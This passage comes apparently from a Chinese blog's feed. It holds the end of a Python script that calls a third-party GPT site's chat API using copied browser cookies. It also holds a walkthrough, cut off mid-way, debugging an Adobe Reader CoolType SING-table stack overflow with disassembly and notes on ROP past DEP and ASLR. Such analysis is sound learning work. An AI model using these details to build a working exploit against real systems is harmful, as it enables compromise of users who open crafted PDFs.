class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">pro, his</span>):</span><br><span class="line">    url = <span class="string">&quot;https://gpt.tool00.com/api/v1/chat/submit&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cookie&quot;</span>: <span class="string">&quot;_ga=GA1.1.800331461.1681885375; FCNEC=%5B%5B%22AKsRol9hmarvKjjCFyL8FNDRa4pULxPROMocI7VYSD0RbFdjyJTZC7l-bg8X9jiqb_sgT20JjKZUcByZcxCISeOtpn6yrS-MfP7fBKq_bnxmfgqatIjGyGj94fs7mzCuRdhlqjb3wptJRkxJW7PtMVyBrDHMULZplA%3D%3D%22%5D%2Cnull%2C%5B%5D%5D; __gads=ID=687486c546a2283f-22c4ae5397e0000b:T=1683182853:RT=1683182853:S=ALNI_MZCmtWOxQGyc3bhufEj8nnhyv6Pqg; __gpi=UID=00000c01738ff6e2:T=1683182853:RT=1683182853:S=ALNI_MZfy93-Hs1rY1R4PPrdQzg6CqPS3w; _ga_60RX9FESNC=GS1.1.1683187497.3.0.1683187497.0.0.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;https://gpt.tool00.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://gpt.tool00.com/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;prompt&quot;</span>: pro,</span><br><span class="line">        <span class="string">&quot;his&quot;</span>: his</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, headers=headers, data=json.dumps(data))</span><br><span class="line">    session = re.search(<span class="string">&quot;[0-9a-z]&#123;8&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;12&#125;&quot;</span>, r.headers[<span class="string">&quot;set-cookie&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> session.group()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stream</span>(<span class="params">session</span>):</span><br><span class="line">    url = <span class="string">&quot;https://gpt.tool00.com/api/v1/chat/stream&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cache-control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cookie&quot;</span>: <span class="string">&quot;_ga=GA1.1.800331461.1681885375; FCNEC=%5B%5B%22AKsRol9hmarvKjjCFyL8FNDRa4pULxPROMocI7VYSD0RbFdjyJTZC7l-bg8X9jiqb_sgT20JjKZUcByZcxCISeOtpn6yrS-MfP7fBKq_bnxmfgqatIjGyGj94fs7mzCuRdhlqjb3wptJRkxJW7PtMVyBrDHMULZplA%3D%3D%22%5D%2Cnull%2C%5B%5D%5D; __gads=ID=687486c546a2283f-22c4ae5397e0000b:T=1683182853:RT=1683182853:S=ALNI_MZCmtWOxQGyc3bhufEj8nnhyv6Pqg; __gpi=UID=00000c01738ff6e2:T=1683182853:RT=1683182853:S=ALNI_MZfy93-Hs1rY1R4PPrdQzg6CqPS3w; _ga_60RX9FESNC=GS1.1.1683187497.3.0.1683187497.0.0.0; session=&quot;</span> + session,</span><br><span class="line">        <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;https://gpt.tool00.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://gpt.tool00.com/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    b = bs(r.content, <span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">    extr = re.findall(<span class="string">&#x27;&quot;content&quot;: &quot;.*&quot;&#x27;</span>, <span class="built_in">str</span>(b))</span><br><span class="line">    ans = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i, n <span class="keyword">in</span> <span class="built_in">enumerate</span>(extr):</span><br><span class="line">        <span class="keyword">if</span> i &gt;= <span class="number">1</span>:</span><br><span class="line">            ans += n[<span class="number">12</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt; &quot;</span> + ans.encode(<span class="string">&quot;utf-8&quot;</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>))</span><br><span class="line"></span><br><span class="line">history = []</span><br><span class="line"><span class="keyword">while</span> (text := <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt; &quot;</span>)):</span><br><span class="line">    <span class="keyword">if</span> text != <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        stream(submit(prompt(text), history))</span><br><span class="line">        history.append(text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <tags>
+        <tag>逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>当PDF来敲门</title>
+    <url>/2023/05/22/PDF%E7%97%85%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%B0%9D%E8%AF%95/</url>
+    <content><![CDATA[<h1 id="我的一个朋友系列"><a href="#我的一个朋友系列" class="headerlink" title="我的一个朋友系列"></a>我的一个朋友系列</h1><p>小时候打游戏肝到一个武器装备(在当时很值钱嗷)，遇到一个人说要跟我聊聊，于是乎，我就在QQ跟人聊天，结果说要发几张图片给我看价格表(PDF格式)，我信了他的邪接收了。结果我上线游戏准备交易，MD鼠标自己动了，直接把东西送给了他，cao，真恶心嗷~</p>
+<p>So，如果打开了陌生人给你发送的某个东西,甚至是个图片,一个pdf 都会让电脑不知不觉成为别人的肉鸡(就是别人想对你的电脑干嘛就干嘛啦~)。</p>
+<p>1.所需环境</p>
+<ul>
+<li>受害者所处操作系统：Windows XP </li>
+<li>虚拟机：VMware workstation</li>
+<li>动态调试：OllyDbg</li>
+<li>静态调试：IDA pro</li>
+<li>漏洞软件：Adobe Reader(版本号-9.3.4)</li>
+</ul>
+<h2 id="2-漏洞描述"><a href="#2-漏洞描述" class="headerlink" title="2.漏洞描述"></a>2.漏洞描述</h2><p>该漏洞是利用Adobe Reader 和 Acrobat中<code>CoolType.dll</code>库在解析字体文件<code>SING</code>表中存在的栈溢出漏洞，导致的结果就是当用户打开了特制的PDF文件后就可能导致任意代码执行</p>
+<h2 id="3-基础知识"><a href="#3-基础知识" class="headerlink" title="3.基础知识"></a>3.基础知识</h2><p>本次漏洞是在PDF当中，因此需要线了解以下pdf文档，首先pdf的格式：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">|------------|</span><br><span class="line">|   header   |头部，用来注明版本号</span><br><span class="line">|------------|</span><br><span class="line">|    body    |主体，图片、文字等</span><br><span class="line">|------------|</span><br><span class="line">| xref table |交叉引用表，存放所有对象的偏移</span><br><span class="line">|------------|</span><br><span class="line">|  trailer   |文件尾部，以%%EOF结尾</span><br><span class="line">|------------|</span><br></pre></td></tr></table></figure></div>
+
+<p>而ttf文件就是pdf中的字体文件，而TTF中关于SING表的数据结构体TableEntry的结构如下：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct_SING&#123;</span><br><span class="line">    <span class="type">char</span> tag[<span class="number">4</span>];        <span class="comment">//标记&quot;SING&quot;</span></span><br><span class="line">    ULONG checkSum;     <span class="comment">//校验和：0xD9BCC8B5</span></span><br><span class="line">    ULONG offset;       <span class="comment">//相对文件的偏移：0x0000011C</span></span><br><span class="line">    ULONG length;       <span class="comment">//数据长度：0x00001DDF</span></span><br><span class="line">&#125;TableEntry;</span><br></pre></td></tr></table></figure></div>
+
+<p>上面是一个定位SING表的引子，接下来是SING表的整体结构:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e71c003ed4fc389b504ec26a0f.jpg"
+                     
+                ></p>
+<p>具体数据结构如下：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FORMAT_SING_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FORMAT_SING_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SING_VERSION VERSION(1, 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SING_UNIQUENAMELEN 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SING_MD5LEN 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Card16 tableVersionMajor;   <span class="comment">//Card16,两字节</span></span><br><span class="line">Card16 tableVersionMinor;</span><br><span class="line">Card16 glyphletVersion;</span><br><span class="line">Card16 permissions;</span><br><span class="line">Card16 mainGID;</span><br><span class="line">Card16 unitsPerEm;</span><br><span class="line">Int16 vertAdvance;</span><br><span class="line">Int16 vertOrigin;</span><br><span class="line">Card8 uniqueName[SING_UNIQUENAMELEN];</span><br><span class="line">Card8 METAMD5[SING_MD5LEN];</span><br><span class="line">Card8 nameLength;</span><br><span class="line">Card8 *baseGlyphName; <span class="comment">/* name array */</span></span><br><span class="line">&#125; SINGTbl;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="4-发现漏洞点"><a href="#4-发现漏洞点" class="headerlink" title="4.发现漏洞点"></a>4.发现漏洞点</h2><p>首先找到位于Adobe文件路径下的动态库</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/32fa828ba61ea8d3a10a50ced20a304e241f58cb.jpg"
+                     
+                ></p>
+<p>打开IDA，分析<code>CoolType.dll</code>库，查看字符串表<code>SING</code>，然后查看交叉引用，这里若是使用F12找的字符串可能会出问题，因此使用ALT + T 组合键来寻找<code>SING</code></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>Language</span></figcaption><table><tr><td class="code"><pre><span class="line">text:0803DCF9                               ; __unwind &#123; // loc_8184A54</span><br><span class="line">.text:0803DCF9 55                            push    ebp</span><br><span class="line">.text:0803DCFA 81 EC 04 01 00 00             sub     esp, 104h                       ; esp开拓栈空间0x104</span><br><span class="line">.text:0803DD00 8D 6C 24 FC                   lea     ebp, [esp-4]</span><br><span class="line">.text:0803DD04 A1 B8 0F 23 08                mov     eax, ___security_cookie</span><br><span class="line">.text:0803DD09 33 C5                         xor     eax, ebp</span><br><span class="line">.text:0803DD0B 89 85 04 01 00 00             mov     [ebp+108h+var_4], eax</span><br><span class="line">.text:0803DD11 6A 4C                         push    4Ch</span><br><span class="line">.text:0803DD13 B8 54 4A 18 08                mov     eax, offset loc_8184A54</span><br><span class="line">.text:0803DD18 E8 B4 A4 00 00                call    __EH_prolog3_catch</span><br><span class="line">.text:0803DD18</span><br><span class="line">.text:0803DD1D 8B 85 1C 01 00 00             mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DD23 8B BD 10 01 00 00             mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DD29 8B 9D 14 01 00 00             mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DD2F 89 7D D8                      mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DD32 89 45 D0                      mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DD35 E8 F2 39 00 00                call    sub_804172C</span><br><span class="line">.text:0803DD35</span><br><span class="line">.text:0803DD3A 33 F6                         xor     esi, esi                        ; esi清0，之后用于判断值是否为空</span><br><span class="line">.text:0803DD3C 83 7F 08 03                   cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DD3C</span><br><span class="line">.text:0803DD40                               ;   try &#123;</span><br><span class="line">.text:0803DD40 89 75 FC                      mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DD43 0F 84 B7 01 00 00             jz      loc_803DF00</span><br><span class="line">.text:0803DD43</span><br><span class="line">.text:0803DD49 89 75 E4                      mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD4C 89 75 E8                      mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DD4F 83 7F 0C 01                   cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DD4F                               ;   &#125; // starts at 803DD40</span><br><span class="line">.text:0803DD4F</span><br><span class="line">.text:0803DD53                               ;   try &#123;</span><br><span class="line">.text:0803DD53 C6 45 FC 01                   mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DD57 0F 85 4C 01 00 00             jnz     loc_803DEA9</span><br><span class="line">.text:0803DD57</span><br><span class="line">.text:0803DD5D 68 2C DB 19 08                push    offset aName                    ; &quot;name&quot;</span><br><span class="line">.text:0803DD62 57                            push    edi                             ; int</span><br><span class="line">.text:0803DD63 8D 4D E4                      lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DD66 C6 45 EF 00                   mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DD6A E8 68 3A FE FF                call    sub_80217D7</span><br><span class="line">.text:0803DD6A</span><br><span class="line">.text:0803DD6F 39 75 E4                      cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD72 75 69                         jnz     short loc_803DDDD</span><br><span class="line">.text:0803DD72</span><br><span class="line">.text:0803DD74 68 4C DB 19 08                push    offset aSing                    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79 57                            push    edi                             ; int</span><br><span class="line">.text:0803DD7A 8D 4D DC                      lea     ecx, [ebp+108h+var_12C]         ; 指向SING表入口</span><br><span class="line">.text:0803DD7D E8 84 3D FE FF                call    sub_8021B06                     ; 处理SING表</span><br><span class="line">.text:0803DD7D</span><br><span class="line">.text:0803DD82 8B 45 DC                      mov     eax, [ebp+108h+var_12C]         ; SING表入口赋值给eax</span><br><span class="line">.text:0803DD85 3B C6                         cmp     eax, esi                        ; 判断表入口是否位空</span><br><span class="line">.text:0803DD85                               ;   &#125; // starts at 803DD53</span><br><span class="line">.text:0803DD85</span><br><span class="line">.text:0803DD87                               ;   try &#123;</span><br><span class="line">.text:0803DD87 C6 45 FC 02                   mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B 74 37                         jz      short loc_803DDC4               ; 若我们处理的SING表不出差错，这里是不会进行跳转的</span><br><span class="line">.text:0803DD8B</span><br><span class="line">.text:0803DD8D 8B 08                         mov     ecx, [eax]                      ; 这里传入的是SING表的第一个四字节，这里是1.0版本，也就是00 01 00 00</span><br><span class="line">.text:0803DD8F 81 E1 FF FF 00 00             and     ecx, 0FFFFh                     ; 这里进行判断想与，会设置对应eflags标志位</span><br><span class="line">.text:0803DD95 74 08                         jz      short loc_803DD9F               ; 由于上一步设置了相应标志位，因此在这里跳转</span><br><span class="line">.text:0803DD95</span><br><span class="line">.text:0803DD97 81 F9 00 01 00 00             cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D 75 21                         jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9D</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F                               loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9C↑j</span><br><span class="line">.text:0803DD9F 83 C0 10                      add     eax, 10h                        ; eax本来是存放SING表首地址，这里加上0x10偏移指向uniqueName</span><br><span class="line">.text:0803DD9F                                                                       ; uniqueName域</span><br><span class="line">.text:0803DDA2 50                            push    eax                             ; Source</span><br><span class="line">.text:0803DDA3 8D 45 00                      lea     eax, [ebp+108h+Destination]     ; Destination是-0x108,所以这里应该就是普通的lea eax,[ebp]</span><br><span class="line">.text:0803DDA6 50                            push    eax                             ; Destination</span><br><span class="line">.text:0803DDA7 C6 45 00 00                   mov     [ebp+108h+Destination], 0</span><br><span class="line">.text:0803DDAB E8 48 3D 13 00                call    strcat                          ; 漏洞点</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="5-样本分析（栈溢出）"><a href="#5-样本分析（栈溢出）" class="headerlink" title="5.样本分析（栈溢出）"></a>5.样本分析（栈溢出）</h2><p>首先获取到对应样本，其为一个pdf，当打开此pdf会有个任意命令执行的功能，具体呈现出的效果为打开一个计算器，如下：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/6609c93d70cf3bc7f8d2ec269400baa1cc112a2d.jpg"
+                     
+                ></p>
+<p>然后执行会出现一个明显的pdf弹框，但不完全，接下来就会出现计算器<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/c9fcc3cec3fdfc03e1b7c272913f8794a5c22628.jpg"
+                     
+                ></p>
+<p>当然也可以是别的命令，真正的恶意样本用来调试，在这里使用计算器只是暂时说明可以任意控制了而已<br>首先打开OD，加载Adobe文件下的AcroRd32可执行文件<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/314e251f95cad1c8c771dded3a3e6709c83d5135.jpg"
+                     
+                ></p>
+<p>然后按下F9来运行程序，这样可以用来加载需要的库<br>这里先配合之前的IDA静态分析的结果，利用ctrl + g进行地址跟踪，然后双击十六进制部分进行断点，至于下断点的位置，有以下三个点，</p>
+<ul>
+<li>首先就是<code>SING</code>表赋值给<code>eax</code>的那个点(0x803dd82)；</li>
+<li>然后就是执行<code>strcat</code>函数的点(0x803ddab)</li>
+<li>最后就是一个关键漏洞点(0x808b308),这个点之后详细介绍</li>
+</ul>
+<p>此时使用OD打开的Adobe Reader打开样本Exploit，然后会断到我们的第三个断点处<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/6a63f6246b600c336800fe025f4c510fd8f9a1fb.jpg"
+                     
+                ></p>
+<p>该指令是执行<code>eax</code>寄存器保存的地址指向的函数，这里可以从右上角的Registers窗口看到<code>eax</code>的值，发现是在栈上的，右键点击<code>eax</code>，然后选择Follow in Stack，这样栈窗口看到<code>eax</code>中保存的值所指向的地址是0x80833EF,返回IDA，查看该地址所在的函数</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> *__cdecl <span class="title function_">sub_80833EF</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">void</span> *a3, <span class="type">size_t</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">size_t</span> *)sub_8083119(a3, *a4);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">size_t</span> *)sub_80830AE(*a4);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      result = (<span class="type">size_t</span> *)sub_80828ED(*(_DWORD *)(a1 + <span class="number">4</span>), <span class="number">0</span>);</span><br><span class="line">      *a4 = (<span class="type">size_t</span>)result;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = a4;</span><br><span class="line">      *a4 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>观察这里是一个<code>switch</code>选择语句，说明这里是处理<code>SING</code>表的时候会执行的函数，接下来再次F9，这里会到达我们之前下的第一个断点，这条指令会将<code>SING</code>表的首地址传入<code>eax</code>，F8 单步执行到下一条指令来查看以下<code>eax</code>的值<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/342ac65c10385343f388a7ebd613b07ecb8088b0.jpg"
+                     
+                ></p>
+<p>首先右键<code>eax</code>，然后选择follow in dump，接着会再二进制窗口显示值指向的地址，这里从之前了解到的<code>SING</code>表结构会知道<code>uniquename</code>的地址应该是<code>SING</code>表偏移0x10字节的地方，也就是0x035529a0,可以看到样本中<code>uniqueName</code>字段十分长，然后单步执行到<code>push eax</code>，这里是将<code>uniqueName</code>字段的地址压栈<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/b2de9c82d158ccbf231c95f05cd8bc3eb0354153.jpg"
+                     
+                ></p>
+<p>再次F9运行到第二个断点处，这里即将调用<code>strcat</code>函数，可以看到其目的地址已经在栈上了，目的地址也是指向栈上的一个缓冲区地址，查看一下目前的目的地址附近的值，在栈窗口上ctrl+g，然后输入目的地址0x12e468<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/8b82b9014a90f603d830bc8d7c12b31bb151ed7c.jpg"
+                     
+                ></p>
+<p>单步F8步过<code>call strcat</code>指令，由于没有对<code>uniquename</code>进行长度检查，这就导致了现如今会将其全部拷贝到栈上指定的地址，结果如下<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/00e93901213fb80e5f23411d73d12f2eb838940d.jpg"
+                     
+                ></p>
+<p>可以看到左边<code>uniqueName</code>字段的值已经赋值到右边栈上0x12e4d8这里了，再来查看之前0x12E6D0,可以看到已经被覆盖为伪造的地址了<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/8718367adab44aed9b8d9e2ef61c8701a08bfb3d.jpg"
+                     
+                ></p>
+<p>可以看到旁边注释也是很清楚，返回到icucnv36.4A80CB38，跳转到该地址来查看一下函数是干啥的，以及为啥要修改之前的返回地址为它<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/6a600c338744ebf8ea5d47f59cf9d72a6159a7c8.jpg"
+                     
+                ></p>
+<p>据目前在上学前班的邻居小孩说，这里是明显的利用ROP绕过DEP保护的手段，但是由于我不了解，所以下面来科普一下相关知识</p>
+<h3 id="1-GS保护"><a href="#1-GS保护" class="headerlink" title="1.GS保护"></a>1.GS保护</h3><p>类似于linux上的canary,函数执行前存放在返回值与ebp上（低地址），然后当程序执行完毕之后会调用检查函数来判断该值是否与之前相同，此时就不能通过覆盖ret地址进行ROP链构造了，而是修改栈上保存的某一个函数指针来进行利用</p>
+<p>IDA反汇编可以看到函数开始前会有如下指令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">text:0803DCF9                               ; __unwind &#123; // loc_8184A54</span><br><span class="line">.text:0803DCF9 55                            push    ebp</span><br><span class="line">.text:0803DCFA 81 EC 04 01 00 00             sub     esp, 104h                       ; esp开拓栈空间0x104</span><br><span class="line">.text:0803DD00 8D 6C 24 FC                   lea     ebp, [esp-4]</span><br><span class="line">.text:0803DD04 A1 B8 0F 23 08                mov     eax, ___security_cookie</span><br><span class="line">.text:0803DD09 33 C5                         xor     eax, ebp</span><br></pre></td></tr></table></figure></div>
+
+<p>结束函数的时候有以下判断</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0803DEE1 E8 A9 A2 00 00                call    @__security_check_cookie@4      ; __security_check_cookie(x)</span><br><span class="line">.text:0803DEE1</span><br><span class="line">.text:0803DEE6 81 C5 08 01 00 00             add     ebp, 108h</span><br><span class="line">.text:0803DEEC C9                            leave</span><br><span class="line">.text:0803DEED C3                            retn</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="2-DEP-Data-Excution-Prevention-数据执行保护"><a href="#2-DEP-Data-Excution-Prevention-数据执行保护" class="headerlink" title="2.DEP(Data Excution Prevention)数据执行保护"></a>2.DEP(Data Excution Prevention)数据执行保护</h3><p>类似于Linux上的NX（不知道为啥名字这俩起不一样干嘛，搞得还以为是新知识点）。所以这里可以使用ROP来进行栈迁移进行绕过，在OD上输入指令alt+m来查看内存情况，类似pwndbg中的vmmap，十分方便（这里插一句相较于Linux我个人还是更喜欢Windows）</p>
+<h3 id="3-ALSR"><a href="#3-ALSR" class="headerlink" title="3.ALSR"></a>3.ALSR</h3><p>终于来了个名字一样的了，在加载程序的时候不再使用固定的基址加载，支持ASLR的程序在其PE头中会设置<br><code>IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE</code>标识来说明其支持ASLR。例如，如果 icucnv36.dll 开启了 ASLR，那么同一个代码的地址，可能是 0x4A80CB38，也可能是 0x5A80CB38。由于无法知道准确的地址，所以也就无法跳转到想要执行的代码。可以点击下面这个小工具来查看对应库中是否开启了ALSR</p>
+<p><a class="link"   href="http://www.scriptjunkie.us/files/pefinder.zip" >&gt;小工具&lt; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>用法如下：</p>
+<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /b /w /s &quot;C:\Program Files\Adobe\*.dll&quot; | pefinder.exe -</span><br></pre></td></tr></table></figure></div>
+
+<p>之前将对应0x12E6D0的栈地址指向的即将修改的函数指针改成0x4A80CB38,他位于icucnv36下（挑选他不是没有理由），打开cmd执行上述命令来查看哪里没开ALSR,可以找到如下信息：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/63d0f703918fa0ecdc5e47c7639759ee3c6ddb5b.jpg"
+                     
+                ></p>
+<p>介绍了几个涉及到的保护知识，接下来再继续分析</p>
+<p>F8单步到call CoolType.08001243处，下一个断点，然后再次单步步过<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/b64543a98226cffcbbc69c78fc014a90f703ea08.jpg"
+                     
+                ></p>
+<p>发现并没有出现什么问题，取消上面打的断点，再接下来单步调试，最后单步会到达之前的第三个断点处，如下图:<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/d009b3de9c82d15881557a7bc50a19d8bd3e4220.jpg"
+                     
+                ></p>
+<p>理论上如果填充大量无关数据，是可以找到这条关键漏洞的地址值的，上面图中给出了<code>eax</code>里面保存的函数指针，这里可以看到接下来就会调用上面的0x4A80CB38的汇编指令了，重新来看看为啥跳转到<code>call [eax]</code>指令，首先ctrl + F2来重新启动程序，按照之前的步骤我们步到这里，如下图：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16cfd1b8abb6deb48f8d5464e1.jpg"
+                     
+                ></p>
+<p>使用F7，进入该函数后，再此单步调试，直到下面这条指令<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/7c1ed21b0ef41bd5d455ca3e14da81cb38db3df1.jpg"
+                     
+                ></p>
+<p>执行该call后会跳到<code>call [eax]</code>,为啥捏？再F7跟进看看<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/d01373f082025aaf30455c01beedab64024f1a80.jpg"
+                     
+                ></p>
+<p>可以看到这就是函数内部了，上面重点标记的指令将<code>ecx</code>的值赋给了<code>eax</code>，我们查看<code>ecx</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/fc1f4134970a304e7f7a823094c8a786c8175c9b.jpg"
+                     
+                ></p>
+<p>右键<code>ecx</code>然后选择follow in dump ，然后左下角二进制会出现相应值，发现<code>ecx</code>值所指向的是0x081A601C，通过右键二进制窗口，选择long–&gt;address，来方便用地址形式来查看内存数据，此时跳转到0x81A601C看看这里存放的是什么宝贝<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e712a338d4fc389b504ec26aa8.jpg"
+                     
+                ></p>
